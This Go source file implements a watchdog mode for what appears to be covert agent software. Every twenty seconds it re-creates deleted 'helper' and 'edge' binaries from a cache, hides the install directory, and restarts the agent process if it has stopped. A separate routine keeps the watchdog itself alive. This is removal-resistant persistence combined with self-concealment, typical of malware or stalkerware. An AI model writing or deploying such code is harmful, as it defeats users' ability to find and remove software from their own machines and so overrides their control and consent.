package main

import (
	"os"
	"strings"
	"time"
)

func wantsWatchdogMode() bool {
	for _, a := range os.Args[1:] {
		al := strings.ToLower(strings.TrimSpace(a))
		if al == "--watch" || al == "-watch" || al == "/watch" {
			return true
		}
	}
	return false
}

func runWatchdog() {
	acquireWatchdogInstance()
	for i := 0; i < 90; i++ {
		if networkOK() {
			break
		}
		time.Sleep(2 * time.Second)
	}
	for {
		restoreHelperFromCache()
		restoreEdgeFromCache()
		hideInstallTree()
		if !agentProcessRunning() {
			startAgentProcess()
		}
		time.Sleep(20 * time.Second)
	}
}

func restoreHelperFromCache() {
	name := helperFileName()
	if st, err := os.Stat(helperPath); err == nil && !st.IsDir() && st.Size() > 1024 {
		toCache(name, helperPath)
		return
	}
	_ = cacheCopy(name, helperPath)
}

func restoreEdgeFromCache() {
	name := edgeFileName()
	if st, err := os.Stat(edgePath); err == nil && !st.IsDir() && st.Size() > 1024 {
		toCache(name, edgePath)
		return
	}
	_ = cacheCopy(name, edgePath)
}

func ensureWatchdogRunning() {
	if watchdogProcessRunning() {
		return
	}
	startWatchdogProcess()
}
